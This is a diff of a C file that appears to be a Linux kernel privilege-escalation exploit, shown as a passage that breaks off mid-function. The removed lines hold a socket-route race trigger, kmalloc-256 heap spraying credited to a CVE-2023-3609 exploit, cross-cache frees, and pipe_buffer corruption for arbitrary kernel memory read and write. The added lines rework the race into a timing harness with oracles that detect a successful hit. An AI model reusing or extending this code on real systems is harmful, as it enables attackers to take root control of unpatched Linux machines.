@@ -1,866 +1,530 @@
-// #include <bits/time.h>
 #define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <netinet/in.h>
+#include <pthread.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdatomic.h>
+#include <stdbool.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <stdbool.h>
-#include <sys/mman.h>
-#include <sys/syscall.h>
-#include <unistd.h>
-#include <stdint.h>
-#include <stddef.h>
-#include <errno.h>
-#include <pthread.h>
-#include <fcntl.h>
-#include <stdatomic.h>
-#include <sched.h>
 #include <string.h>
-#include <sys/timerfd.h>
-#include <assert.h>
-#include <sys/uio.h>
-#include <sys/ioctl.h>
-#include <sys/wait.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <netinet/udp.h>
-#include <sys/syscall.h>
+#include <sys/poll.h>
 #include <sys/resource.h>
-#include <arpa/inet.h>
-#include <root_payload.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/timerfd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <time.h>
+#include <unistd.h>
 
-typedef uint64_t u64;
-typedef int64_t i64;
-typedef uint32_t u32;
-typedef int32_t i32;
-typedef uint16_t u16;
-typedef int16_t i16;
+#ifndef SO_CNX_ADVICE
+#define SO_CNX_ADVICE 53
+#endif
+
+#ifndef MSG_PROBE
+#define MSG_PROBE 0x10
+#endif
+
 typedef uint8_t u8;
-typedef int8_t i8;
-
+typedef uint64_t u64;
 typedef size_t usize;
 
-#define LOG(fmt, ...) do { \
-    printf(fmt "\n", ##__VA_ARGS__); \
-} while(0)
+#define LOG(fmt, ...)                                                           \
+    do {                                                                        \
+        printf(fmt "\n", ##__VA_ARGS__);                                       \
+        fflush(stdout);                                                         \
+    } while (0)
 
-#define SYSCHK(x) ({                  \
-    __typeof__(x) __res = (x);          \
-    if (__res == (__typeof__(x))-1) {   \
-        LOG("SYSCHK(" #x ") = %d\n", __res);\
-        int error_val = errno;            \
-        LOG("errno: %d\n", error_val);    \
-        exit(1);                          \
-    }                                   \
-    __res;                              \
-})
+#define SYSCHK(x)                                                               \
+    ({                                                                          \
+        __typeof__(x) __res = (x);                                              \
+        if (__res == (__typeof__(x))-1) {                                       \
+            int __err = errno;                                                  \
+            fprintf(stderr, "SYSCHK(%s) failed: errno=%d (%s)\n", #x, __err,    \
+                    strerror(__err));                                           \
+            exit(1);                                                            \
+        }                                                                       \
+        __res;                                                                  \
+    })
 
-#define CHECK(x, n) ({                  \
-    __typeof__(x) __res = (x);          \
-    if (__res != n) {   \
-        LOG("SYSCHK(" #x ") = %d\n", __res);\
-        int error_val = errno;            \
-        LOG("errno: %d\n", error_val);    \
-        exit(1);                          \
-    }                                   \
-    __res;                              \
-})
+typedef enum {
+    LOCK_ORACLE_RETURNED = 0,
+    LOCK_ORACLE_BLOCKED = 1,
+    LOCK_ORACLE_FORK_FAILED = 2,
+} LockOracleState;
 
-void panic(const char *msg) {
-    puts(msg);
-    exit(1);
-}
+typedef struct {
+    LockOracleState state;
+    int child_errno;
+    int child_status;
+    pid_t pid;
+} LockOracleResult;
 
-int pin_thread_to_cpu(pid_t pid, int cpu) {
-    int rc;
-    int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
-    cpu_set_t *cpu_setp = CPU_ALLOC(num_cpus);
-    size_t size = CPU_ALLOC_SIZE(num_cpus);
-    CPU_ZERO_S(size, cpu_setp);
-    if (cpu >= 0 && cpu < num_cpus) {
-        CPU_SET_S(cpu, size, cpu_setp);
-    } else {
-        for (int i = 0; i < num_cpus; i++) {
-            CPU_SET_S(i, size, cpu_setp);
-        }
-    }
+typedef enum {
+    CACHE_ORACLE_ERR = -1,
+    CACHE_ORACLE_NULL = 0,
+    CACHE_ORACLE_VISIBLE = 1,
+} CacheOracleState;
 
-    rc = sched_setaffinity(pid, size, cpu_setp);
-    // if (rc) {
-    //     printf("cpu %d failed to be pinned (num cpus = %d)\n", cpu, num_cpus);
-    //     perror("sched_setaffinity");
-    // }
-    CPU_FREE(cpu_setp);
-    return rc;
-}
+typedef struct {
+    CacheOracleState state;
+    int mtu;
+    int err;
+} CacheOracleResult;
 
-int pin_to_cpu(int cpu) {
-    return pin_thread_to_cpu(0, cpu);
-}
+typedef struct {
+    atomic_int ready_count;
+    atomic_int trigger_tid;
+    atomic_int trigger_done;
+    atomic_int trigger_ret;
+    atomic_int trigger_errno;
+    atomic_int vuln_socket;
+    int timer_fd;
+    int sync_pipe[2];
+    u64 timer_offset_ns;
+    usize align_pad;
+    int trigger_cpu;
+    bool use_sched_idle;
+} TriggerCtx;
 
-void make_thread_idle() {
-    struct sched_param param;
+typedef struct {
+    int cpu;
+    atomic_int *ready_count;
+} BlockerArg;
 
-    memset(&param, 0, sizeof(param));
-    SYSCHK(sched_setscheduler(0, SCHED_IDLE, &param));
-}
-
-u64 now_ns() {
+static u64 now_ns(void) {
     struct timespec ts;
-
     SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
-
     return (u64)ts.tv_sec * 1000000000ull + (u64)ts.tv_nsec;
 }
 
 static struct timespec ns_to_timespec(u64 ns) {
     struct timespec ts;
-
     ts.tv_sec = (time_t)(ns / 1000000000ull);
     ts.tv_nsec = (long)(ns % 1000000000ull);
     return ts;
 }
 
-
-typedef struct {
-    int read_fd;
-    int write_fd;
-} Pipe;
-
-Pipe open_pipe() {
-    int fds[2] = { 0 };
-    SYSCHK(pipe(fds));
-    Pipe pipe = {
-        .read_fd = fds[0],
-        .write_fd = fds[1],
-    };
-    return pipe;
+static u64 env_u64(const char *name, u64 fallback) {
+    const char *value = getenv(name);
+    if (!value || !*value)
+        return fallback;
+    errno = 0;
+    char *end = NULL;
+    unsigned long long parsed = strtoull(value, &end, 0);
+    if (errno || end == value)
+        return fallback;
+    return (u64)parsed;
 }
 
-void pipe_close(Pipe *pipe) {
-    SYSCHK(close(pipe->read_fd));
-    SYSCHK(close(pipe->write_fd));
+static const char *env_str(const char *name, const char *fallback) {
+    const char *value = getenv(name);
+    return (value && *value) ? value : fallback;
 }
 
-void pipe_set_buf_size(Pipe *pipe, usize size) {
-    CHECK(fcntl(pipe->write_fd, F_SETPIPE_SZ, size), size);
+static int online_cpus(void) {
+    long n = sysconf(_SC_NPROCESSORS_ONLN);
+    return n > 0 ? (int)n : 1;
 }
 
-void pipe_prefault(Pipe *pipe) {
-    u8 buf = 0;
-    SYSCHK(write(pipe->write_fd, &buf, sizeof(buf)));
-    CHECK(read(pipe->read_fd, &buf, sizeof(buf)), sizeof(buf));
+static int pin_thread_to_cpu(pid_t tid, int cpu) {
+    int ncpu = online_cpus();
+    if (cpu < 0 || cpu >= ncpu)
+        return -1;
+
+    cpu_set_t *set = CPU_ALLOC(ncpu);
+    if (!set)
+        return -1;
+    size_t set_size = CPU_ALLOC_SIZE(ncpu);
+    CPU_ZERO_S(set_size, set);
+    CPU_SET_S(cpu, set_size, set);
+    int rc = sched_setaffinity(tid, set_size, set);
+    CPU_FREE(set);
+    return rc;
 }
 
-#define NUM_SPRAY 0x400
-#define SPRAY_SIZE 0x100
+static int pin_self_to_cpu(int cpu) {
+    return pin_thread_to_cpu(0, cpu);
+}
 
-// sendmsg spray adapted from CVE-2023-3609 exploit
-// payload to send on socket
-u8 dummy_buf[0x1000] = { 0 };
+static void make_self_sched_idle(void) {
+    struct sched_param param;
+    memset(&param, 0, sizeof(param));
+    if (sched_setscheduler(0, SCHED_IDLE, &param) != 0)
+        LOG("warn: sched_setscheduler(SCHED_IDLE) failed errno=%d", errno);
+}
 
-// payload sprayed to overlap with
-u8 payload[SPRAY_SIZE] = { 0 };
+static void set_file_limit(rlim_t limit) {
+    struct rlimit rl;
+    if (getrlimit(RLIMIT_NOFILE, &rl) != 0)
+        return;
+    if (rl.rlim_max < limit)
+        rl.rlim_max = limit;
+    rl.rlim_cur = limit < rl.rlim_max ? limit : rl.rlim_max;
+    if (setrlimit(RLIMIT_NOFILE, &rl) != 0)
+        LOG("warn: setrlimit(RLIMIT_NOFILE) failed errno=%d", errno);
+}
 
-int control_socket[2] = { 0 };
-int spray_sockets[NUM_SPRAY][2] = { 0 };
-atomic_int spray_count = 0;
+static int open_connected_ipv6_udp_socket(const char *addr_string, int port) {
+    int fd = SYSCHK(socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP));
 
-
-void *spray_thread(void *x) {
-    size_t index = (size_t)x;
-    pin_to_cpu(0);
-
-    for (;;) {
-        write(control_socket[0], dummy_buf, 1);
-        read(control_socket[0], dummy_buf, 1);
-
-        struct iovec iov = {
-            .iov_base = dummy_buf,
-            .iov_len = sizeof(dummy_buf),
-        };
-
-        struct msghdr msg = {
-            .msg_iov = &iov,
-            .msg_iovlen = 1,
-            .msg_control = payload,
-            .msg_controllen = sizeof(payload),
-        };
-
-        atomic_fetch_add(&spray_count, 1);
-        sendmsg(spray_sockets[index][1], &msg, 0);
+    struct sockaddr_in6 addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin6_family = AF_INET6;
+    addr.sin6_port = htons((uint16_t)port);
+    if (inet_pton(AF_INET6, addr_string, &addr.sin6_addr) != 1) {
+        LOG("bad IPv6 address: %s", addr_string);
+        exit(1);
     }
 
+    SYSCHK(connect(fd, (struct sockaddr *)&addr, sizeof(addr)));
+    return fd;
+}
+
+static CacheOracleResult run_ipv6_mtu_cache_oracle(int fd) {
+    CacheOracleResult result = {
+        .state = CACHE_ORACLE_ERR,
+        .mtu = -1,
+        .err = 0,
+    };
+    int mtu = 0;
+    socklen_t mtu_len = sizeof(mtu);
+
+    if (getsockopt(fd, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len) == 0) {
+        result.state = CACHE_ORACLE_VISIBLE;
+        result.mtu = mtu;
+        return result;
+    }
+
+    result.err = errno;
+    if (errno == ENOTCONN)
+        result.state = CACHE_ORACLE_NULL;
+    return result;
+}
+
+static const char *cache_state_name(CacheOracleState state) {
+    switch (state) {
+    case CACHE_ORACLE_VISIBLE:
+        return "visible";
+    case CACHE_ORACLE_NULL:
+        return "null";
+    default:
+        return "error";
+    }
+}
+
+static LockOracleResult run_ipv6_dstopts_lock_oracle(int fd, u64 timeout_us) {
+    LockOracleResult result = {
+        .state = LOCK_ORACLE_FORK_FAILED,
+        .child_errno = 0,
+        .child_status = 0,
+        .pid = -1,
+    };
+
+    int err_pipe[2];
+    if (pipe(err_pipe) != 0)
+        return result;
+
+    pid_t pid = fork();
+    if (pid < 0) {
+        close(err_pipe[0]);
+        close(err_pipe[1]);
+        return result;
+    }
+
+    if (pid == 0) {
+        close(err_pipe[0]);
+        u8 control[256];
+        memset(control, 0, sizeof(control));
+        socklen_t len = sizeof(control);
+        int rc = getsockopt(fd, SOL_IPV6, IPV6_DSTOPTS, control, &len);
+        int err = rc == 0 ? 0 : errno;
+        (void)write(err_pipe[1], &err, sizeof(err));
+        _exit(rc == 0 ? 0 : 1);
+    }
+
+    close(err_pipe[1]);
+    result.pid = pid;
+
+    u64 start = now_ns();
+    for (;;) {
+        int status = 0;
+        pid_t got = waitpid(pid, &status, WNOHANG);
+        if (got == pid) {
+            result.state = LOCK_ORACLE_RETURNED;
+            result.child_status = status;
+            int child_errno = 0;
+            (void)read(err_pipe[0], &child_errno, sizeof(child_errno));
+            result.child_errno = child_errno;
+            close(err_pipe[0]);
+            return result;
+        }
+        if (got < 0 && errno != EINTR) {
+            result.state = LOCK_ORACLE_RETURNED;
+            result.child_errno = errno;
+            close(err_pipe[0]);
+            return result;
+        }
+        if ((now_ns() - start) >= timeout_us * 1000ull) {
+            kill(pid, SIGKILL);
+            waitpid(pid, &status, 0);
+            result.state = LOCK_ORACLE_BLOCKED;
+            result.child_status = status;
+            close(err_pipe[0]);
+            return result;
+        }
+        usleep(50);
+    }
+}
+
+static const char *lock_state_name(LockOracleState state) {
+    switch (state) {
+    case LOCK_ORACLE_BLOCKED:
+        return "blocked";
+    case LOCK_ORACLE_RETURNED:
+        return "returned";
+    default:
+        return "fork_failed";
+    }
+}
+
+static bool wait_timerfd(int timer_fd, u64 timeout_us, u64 *overruns) {
+    struct pollfd pfd = {
+        .fd = timer_fd,
+        .events = POLLIN,
+    };
+    int rc = poll(&pfd, 1, (int)((timeout_us + 999) / 1000));
+    if (rc <= 0)
+        return false;
+    if (!(pfd.revents & POLLIN))
+        return false;
+    return read(timer_fd, overruns, sizeof(*overruns)) == (ssize_t)sizeof(*overruns);
+}
+
+static void release_trigger_to_cpu(TriggerCtx *ctx, u64 timeout_us) {
+    int tid = atomic_load(&ctx->trigger_tid);
+    if (tid > 0)
+        (void)pin_thread_to_cpu(tid, ctx->trigger_cpu);
+
+    u64 start = now_ns();
+    while (!atomic_load(&ctx->trigger_done)) {
+        if ((now_ns() - start) >= timeout_us * 1000ull)
+            break;
+        usleep(100);
+    }
+}
+
+static void *blocker_thread(void *arg) {
+    BlockerArg *blocker = (BlockerArg *)arg;
+    if (blocker->cpu >= 0)
+        (void)pin_self_to_cpu(blocker->cpu);
+    atomic_fetch_add(blocker->ready_count, 1);
+
+    volatile u64 sink = 0;
+    for (;;) {
+        sink++;
+        asm volatile("" ::"r"(sink) : "memory");
+    }
     return NULL;
 }
 
-void setup_spray() {
-    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, control_socket));
-
-    memset(payload, 0, sizeof(payload));
-    memset(dummy_buf, 0, sizeof(dummy_buf));
-
-    struct cmsghdr *control_header = (struct cmsghdr *) &payload[0];
-    control_header->cmsg_len = sizeof(payload);
-    control_header->cmsg_level = 0;
-    control_header->cmsg_type = 0;
-
-    for (usize i = 0; i < NUM_SPRAY; i++) {
-        SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, spray_sockets[i]));
-
-        u32 buf_size = 0x800;
-        SYSCHK(setsockopt(spray_sockets[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&buf_size, sizeof(buf_size)));
-        SYSCHK(setsockopt(spray_sockets[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&buf_size, sizeof(buf_size)));
-        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
-    }
-
-    atomic_store(&spray_count, 0);
-
-    pthread_t tid = 0;
-    for (usize i = 0; i < NUM_SPRAY; i++) {
-        pthread_create(&tid, 0, spray_thread, (void *)i);
-        pthread_detach(tid);
-    }
-
-    // wait for threads to get setup
-    int to_read = NUM_SPRAY;
-    while (to_read > 0) {
-        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
-    }
-}
-
-void do_spray() {
-    write(control_socket[1], dummy_buf, NUM_SPRAY);
-
-    // wait for spray to finish
-    // atomic at least indicates all threads run, but not necessarily all sendmsg called
-    // extra sleep is good safeguard that makes it very likely all messages sent
-    while (atomic_load(&spray_count) != NUM_SPRAY) {}
-    sleep(1);
-}
-
-// fees sprayed heap items
-void free_spray() {
-    // drain all sprayed messages
-    for (usize i = 0; i < NUM_SPRAY; i++) {
-        SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
-    }
-}
-
-// resets spray threads back to initial state after setup spray
-void reset_spray() {
-    for (usize i = 0; i < NUM_SPRAY; i++) {
-        // drain remaining cmsg message
-        SYSCHK(read(spray_sockets[i][0], dummy_buf, sizeof(dummy_buf)));
-        // write back first message
-        write(spray_sockets[i][1], dummy_buf, sizeof(dummy_buf));
-    }
-
-    // wait for threads to get setup
-    int to_read = NUM_SPRAY;
-    while (to_read > 0) {
-        to_read -= read(control_socket[1], dummy_buf, NUM_SPRAY);
-    }
-
-    atomic_store(&spray_count, 0);
-}
-
-int open_connected_ipv6_udp_socket() {
-    int socket_fd = SYSCHK(socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP));
-
-    struct sockaddr_in6 addr = { 0 };
-    addr.sin6_family = AF_INET6;
-    addr.sin6_port = htons(1337);
-    SYSCHK(inet_pton(AF_INET6, "::1", &addr.sin6_addr));
-
-    SYSCHK(connect(socket_fd, (struct sockaddr*)&addr, sizeof(addr)));
-
-    return socket_fd;
-}
-
-void open_many_sockets(int *fd_array, usize len) {
-    for (usize i = 0; i < len; i++) {
-        fd_array[i] = open_connected_ipv6_udp_socket();
-    }
-}
-
-void close_fds(int *fd_array, usize len) {
-    for (usize i = 0; i < len; i++) {
-        SYSCHK(close(fd_array[i]));
-    }
-}
-
-
-/////////////////////////////
-//// Addr / Leak Utils   ////
-/////////////////////////////
-
-#define VMEMMAP_START 0xfffffffeffe00000
-#define LINEAR_BASE 0xffffff8000000000
-#define PHYS_BASE 0x200000
-
-#define PAGE_OFFSET_BASE 0x676900
-#define PIPE_OPS_OFFSET 0x676900
-
-usize vmem_base = 0;
-usize kaslr_base = 0;
-usize phys_base = 0;
-usize linear_base = 0;
-
-usize addr_to_page(usize addr) {
-  return ((addr >> 12) << 6) + vmem_base;
-}
-
-usize is_linear_address(usize addr) {
-  return (addr & 0xffff000000000000) == 0xffff000000000000;
-}
-
-usize is_kernel_address(usize addr) {
-  return (addr & 0xffffffc000000000) == 0xffffffc000000000;
-}
-
-
-/////////////////////////////
-//// Pipe Buffer R/W     ////
-/////////////////////////////
-
-struct pipe_buffer_t {
-  unsigned long page;
-  unsigned int offset, len;
-  unsigned long ops;
-  unsigned long flag;
-  unsigned long private;
-};
-
-typedef struct {
-    Pipe exp_pipe;
-    Pipe exp_page_pipe;
-    usize pipe_page_offset;
-    struct pipe_buffer_t pipe_buffer_leak;
-} RwContext;
-
-RwContext global_rw_context = { 0 };
-
-unsigned long read64(usize addr) {
-    if ((addr & 0xfff) + 8 > 0x1000) {
-        panic("invalid read");
-        return 0;
-    }
-
-    u8 buffer[0x1000] = { 0 };
-    SYSCHK(read(global_rw_context.exp_page_pipe.read_fd, buffer, sizeof(buffer)));
-
-    memset(buffer, 'D', 0x1000);
-    struct pipe_buffer_t *pipe_buffer = (struct pipe_buffer_t *) (&buffer[global_rw_context.pipe_page_offset]);
-
-    memcpy(pipe_buffer, &global_rw_context.pipe_buffer_leak, sizeof(struct pipe_buffer_t));
-
-    pipe_buffer->page = addr_to_page(addr);
-    pipe_buffer->len = 9;
-    pipe_buffer->offset = addr & 0xfff;
-    for (usize i = 1; i < 4; i++) {
-        memcpy(pipe_buffer + i, pipe_buffer, 40);
-    }
-
-    // overwrite pipe_buffer
-    SYSCHK(write(global_rw_context.exp_page_pipe.write_fd, buffer, sizeof(buffer)));
-
-    // now do the read memory
-    usize data;
-    SYSCHK(read(global_rw_context.exp_pipe.read_fd, &data, sizeof(data)));
-    return data;
-}
-
-void write64(usize addr, usize data) {
-    assert((addr & 0xfff) + 8 <= 0x1000);
-
-    u8 buffer[0x1000] = { 0 };
-    SYSCHK(read(global_rw_context.exp_page_pipe.read_fd, buffer, sizeof(buffer)));
-
-    memset(buffer, 'D', 0x1000);
-    struct pipe_buffer_t *pipe_buffer = (struct pipe_buffer_t *) (&buffer[global_rw_context.pipe_page_offset]);
-
-    memcpy(pipe_buffer, &global_rw_context.pipe_buffer_leak, sizeof(struct pipe_buffer_t));
-
-    pipe_buffer->page = addr_to_page(addr);
-    pipe_buffer->len = 0;
-    pipe_buffer->offset = addr & 0xfff;
-    for (usize i = 1; i < 4; i++) {
-        memcpy(pipe_buffer + i, pipe_buffer, 40);
-    }
-
-    // overwrite pipe_buffer
-    SYSCHK(write(global_rw_context.exp_page_pipe.write_fd, buffer, sizeof(buffer)));
-
-    // now do the write of memory
-    SYSCHK(write(global_rw_context.exp_pipe.write_fd, &data, sizeof(data)));
-}
-
-usize read64_kernel(usize addr) {
-    return read64(addr - kaslr_base + phys_base);
-}
-
-void write64_kernel(usize addr, usize data) {
-    write64(addr - kaslr_base + phys_base, data);
-}
-
-usize read64_virtual(usize addr) {
-    // return read64(addr - 0xffff888000000000);
-    return read64(addr - linear_base);
-}
-
-void write64_virtual(usize addr, usize data) {
-    // return write64(addr - 0xffff888000000000, data);
-    return write64(addr - linear_base, data);
-}
-
-usize read64_all(usize addr) {
-    if (is_kernel_address(addr)) {
-        return read64_kernel(addr);
-    } else {
-        return read64_virtual(addr);
-    }
-}
-
-void write64_all(usize addr, usize data) {
-    if (is_kernel_address(addr)) {
-        write64_kernel(addr, data);
-    } else {
-        write64_virtual(addr, data);
-    }
-}
-
-void read_mem(usize addr, usize *data, usize size) {
-    for (int i=0; i<size/8; i++) {
-        data[i] = read64(addr+i*8);
-    }
-}
-
-void write_mem(usize addr, usize *data, usize size) {
-    for (int i=0; i<size/8; i++) {
-        write64(addr+i*8, data[i]);
-    }
-}
-
-void scan_kernel_phys_base() {
-    // scanning did not work for some reason
-    phys_base = PHYS_BASE;
-    // phys_base = 0;
-    // for (;;) {
-    //   usize value = read64(phys_base + 0x38);
-    //   if (!memcmp(&phys_base, "ARMd", 4)) {
-    //     break;
-    //   }
-
-    //   phys_base += 0x1000;
-    // }
-}
-
-
-/////////////////////////////
-//// Trigger Logic       ////
-/////////////////////////////
-
-
-#define NUM_PAGE_PIPES 0x600
-#define NUM_VULN_PIPES 0x20
-#define NUM_PRE_SOCKETS 1024
-#define NUM_POST_SOCKETS 1024
-
-typedef struct {
-    atomic_int ready_counter;
-    // atomic_int timer_wakeup;
-    int timer_fd;
-    atomic_int vuln_socket;
-    int pre_sockets[NUM_PRE_SOCKETS];
-    int post_sockets[NUM_POST_SOCKETS];
-    atomic_int trigger_thread;
-    Pipe sync_pipe_to_trigger;
-    u64 timer_offset;
-} TriggerCtx;
-
-void *run_cpu1_block_thread(void *arg) {
-    pin_to_cpu(1);
-
-    TriggerCtx *ctx = (TriggerCtx *) arg;
-    atomic_fetch_add(&ctx->ready_counter, 1);
-
-    // busy loop forever
-    for (;;) {}
-}
-
-void *run_trigger_thread(void *arg) {
-    TriggerCtx *ctx = (TriggerCtx *) arg;
-    atomic_store(&ctx->trigger_thread, syscall(SYS_gettid));
-
-    pin_to_cpu(0);
-    make_thread_idle();
-
-    // retry race in loop
-    for (;;) {
-        // wait with pipe, needed also because timer could fire in weird spots
-        // where ready counter is still 2
-        u8 buf = 0;
-        SYSCHK(read(ctx->sync_pipe_to_trigger.read_fd, &buf, sizeof(buf)));
-
-        // wait for other threads to be ready
-        while (atomic_load(&ctx->ready_counter) < 2) {}
-
-        // ensure we are on cpu 0 (should already be done)
-        pin_to_cpu(0);
-
-        // wait a bit more just in case
-        // for (usize i = 0; i < 1024 * 1024; i++) {}
-
-        // read socket fd before setting timer, if timer expires before setsockopt main thread might change socket
-        int socket_fd = atomic_load(&ctx->vuln_socket);
-
-        // arm timer
-        struct itimerspec spec = { 0 };
-        spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset);
-        SYSCHK(timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL));
-
-        int one = 1;
-        // don't check result, socket might be closed
-        setsockopt(socket_fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
-    }
-}
-
-void try_run_main_exploit(TriggerCtx *ctx);
-
-void trigger_vuln_loop() {
-    // setup spray threads before anything else
-    setup_spray();
-
-    pthread_t cpu1_block_thread = { 0 };
-    pthread_t trigger_thread = { 0 };
-
-    TriggerCtx ctx = {
-        .ready_counter = 0,
-        .timer_fd = SYSCHK(timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC)),
-        .vuln_socket = 0,
-        .pre_sockets = { 0 },
-        .post_sockets = { 0 },
-        .trigger_thread = 0,
-        .sync_pipe_to_trigger = open_pipe(),
-        .timer_offset = 20000,
-    };
-
-    // this thread will spin on cpu1 forever
-    SYSCHK(pthread_create(&cpu1_block_thread, NULL, run_cpu1_block_thread, (void *) &ctx));
-
-    // create the trigger thread
-    SYSCHK(pthread_create(&trigger_thread, NULL, run_trigger_thread, (void *) &ctx));
-
-    // wait for trigger thread tid to become available
-    while (atomic_load(&ctx.trigger_thread) == 0) {}
-    pid_t trigger_pid = atomic_load(&ctx.trigger_thread);
-
-    usize iteration_count = 0;
-    usize too_long_count = 0;
-
-    // spray sockets for setup
-    open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
-    ctx.vuln_socket = open_connected_ipv6_udp_socket();
-    open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
+static void *trigger_thread(void *arg) {
+    TriggerCtx *ctx = (TriggerCtx *)arg;
+    atomic_store(&ctx->trigger_tid, (int)syscall(SYS_gettid));
+
+    if (ctx->trigger_cpu >= 0)
+        (void)pin_self_to_cpu(ctx->trigger_cpu);
+    if (ctx->use_sched_idle)
+        make_self_sched_idle();
+
+    atomic_fetch_add(&ctx->ready_count, 1);
 
     for (;;) {
-        // adjust timerfd timing based on previous runs
-        if (iteration_count == 5) {
-            if (too_long_count == 5) {
-                ctx.timer_offset -= 23;
-                LOG("\nDecrease time window to: %lu\n", ctx.timer_offset);
-            } else if (too_long_count == 0) {
-                // being too short is much more expensive
-                ctx.timer_offset += 15013;
-                LOG("\nIncrease time window to: %lu\n", ctx.timer_offset);
-            }
-            // if there was a mix of too long and too short, we will eventually hit the race probably
+        u8 byte = 0;
+        ssize_t n = read(ctx->sync_pipe[0], &byte, sizeof(byte));
+        if (n <= 0)
+            continue;
 
-            iteration_count = 0;
-            too_long_count = 0;
-        }
+        for (usize i = 0; i < ctx->align_pad; i++)
+            asm volatile("" ::: "memory");
 
-        // let trigger know it can continue another iteration
-        u8 buf = 0;
-        SYSCHK(write(ctx.sync_pipe_to_trigger.write_fd, &buf, sizeof(buf)));
+        atomic_store(&ctx->trigger_done, 0);
+        atomic_store(&ctx->trigger_ret, 0);
+        atomic_store(&ctx->trigger_errno, 0);
 
-        // sets up trigger thread to run and trigger exploit
-        pin_thread_to_cpu(trigger_pid, 0);
-
-        // trigger actual exploit (will context switch to trigger thread)
-        atomic_fetch_add(&ctx.ready_counter, 1);
-        u64 result = 0;
-        SYSCHK(read(ctx.timer_fd, &result, sizeof(result)));
-        atomic_fetch_sub(&ctx.ready_counter, 1); // no longer ready
-
-        // move trigger thread to cpu, so we can sleep and such and not worry about blocking
-        pin_thread_to_cpu(trigger_pid, 1);
-
-        iteration_count += 1;
-
-        int mtu = 0;
-        socklen_t mtu_len = sizeof(mtu);
-        if (getsockopt(ctx.vuln_socket, SOL_IPV6, IPV6_MTU, &mtu, &mtu_len) == -1) {
-            LOG("FAIL: race window too long");
-            // race failed: too long
-            too_long_count += 1;
-
-            // reset just the vuln socket, sprayed sockets don't need to be reset
-            SYSCHK(close(ctx.vuln_socket));
-            ctx.vuln_socket = open_connected_ipv6_udp_socket();
-
+        int fd = atomic_load(&ctx->vuln_socket);
+        struct itimerspec spec;
+        memset(&spec, 0, sizeof(spec));
+        spec.it_value = ns_to_timespec(now_ns() + ctx->timer_offset_ns);
+        if (timerfd_settime(ctx->timer_fd, TFD_TIMER_ABSTIME, &spec, NULL) != 0) {
+            atomic_store(&ctx->trigger_ret, -1);
+            atomic_store(&ctx->trigger_errno, errno);
+            atomic_store(&ctx->trigger_done, 1);
             continue;
         }
 
-        LOG("\nrun exploit...");
-
-        // try exploit: race may or may not have succeeded
-        // doesn't seem like a cheap way to see if race suceeded other then doing the exploit
-        // there may be an option which requires a remote server
-        try_run_main_exploit(&ctx);
-
-        // if we returned, setup sockets for retry
-        open_many_sockets(ctx.pre_sockets, NUM_PRE_SOCKETS);
-        ctx.vuln_socket = open_connected_ipv6_udp_socket();
-        open_many_sockets(ctx.post_sockets, NUM_POST_SOCKETS);
-
-        // also prepare spray again
-        reset_spray();
+        int one = 1;
+        int rc = setsockopt(fd, SOL_SOCKET, SO_CNX_ADVICE, &one, sizeof(one));
+        atomic_store(&ctx->trigger_ret, rc);
+        atomic_store(&ctx->trigger_errno, rc == 0 ? 0 : errno);
+        atomic_store(&ctx->trigger_done, 1);
     }
+    return NULL;
 }
 
-// returns on failure, should be retried
-void try_run_main_exploit(TriggerCtx *ctx) {
-    Pipe page_pipes[NUM_PAGE_PIPES] = { 0 };
-    Pipe vuln_pipes[NUM_VULN_PIPES] = { 0 };
-
-    LOG("open pipes...");
-    // setup page pipes to have 1 pipe buffer entry with 1 backing page, but don't prefault
-    for (usize i = 0; i < NUM_PAGE_PIPES; i++) {
-        page_pipes[i] = open_pipe();
-        pipe_set_buf_size(&page_pipes[i], 0x1000);
-    }
-
-    // initially put vuln pipes in smaller cache
-    for (usize i = 0; i < NUM_VULN_PIPES; i++) {
-        vuln_pipes[i] = open_pipe();
-        pipe_set_buf_size(&vuln_pipes[i], 0x1000);
-        pipe_prefault(&vuln_pipes[i]);
-
-        // not sure if this write is needed
-        // just copied from bad io uring structure
-        u8 buf = 0;
-        write(vuln_pipes[i].write_fd, &buf, sizeof(buf));
-    }
-
-    LOG("rt6_info cross cache free...");
-    // close many sockets, hopefully buddy allocator reclaims backing page
-    close_fds(ctx->pre_sockets, NUM_PRE_SOCKETS);
-    close_fds(ctx->post_sockets, NUM_POST_SOCKETS);
-
-    // TODO: setup payload we want to spray
-    // after spray, dst_cache hopefully reclaimed
-    LOG("spray kmalloc-256...");
-    do_spray();
-
-    // now write/send should trigger 'invalid' dst_cache route to be released
-    LOG("trigger kmalloc-256 invalid free...");
-    u8 buf = 0;
-    SYSCHK(write(ctx->vuln_socket, &buf, sizeof(buf)));
-
-    // change vuln pipe buffer to put them in kmalloc-256
-    // will hopefully cause pipe to fill freed slot in sprayed object
-    LOG("reclaim with struct pipe_buffer_t...");
-    for (usize i = 0; i < NUM_VULN_PIPES; i++) {
-        pipe_set_buf_size(&vuln_pipes[i], 4 * 0x1000);
-    }
-
-    // trigger all sprayed objects to be freed
-    // will trigger a page with vuln pipe to be freed
-    LOG("kmalloc-256 cross cache free...");
-    free_spray();
-
-    // attempt to reclaim vuln pipe with another pipe backing page
